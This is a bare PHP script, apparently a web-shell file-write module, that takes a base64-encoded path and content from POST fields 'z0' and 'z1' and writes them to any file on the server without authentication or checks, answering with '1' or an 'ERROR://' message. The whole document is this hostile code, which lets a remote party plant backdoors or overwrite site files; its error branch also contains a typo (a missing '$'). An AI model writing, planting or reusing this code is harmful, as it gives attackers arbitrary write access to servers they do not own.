<?php

$szFilePath = base64_decode($_POST['z0']);
$szContent = base64_decode($_POST['z1']);

$file = fopen($szFilePath, 'w') or die('ERROR://Unable to open file.');
try
{
    fwrite($file, $szContent);
    echo('1');
}
catch (Exception $ex)
{
    $szMsg = 'ERROR://'.$ex->getMessage();
    echo(szMsg);
}
fclose($file);

?>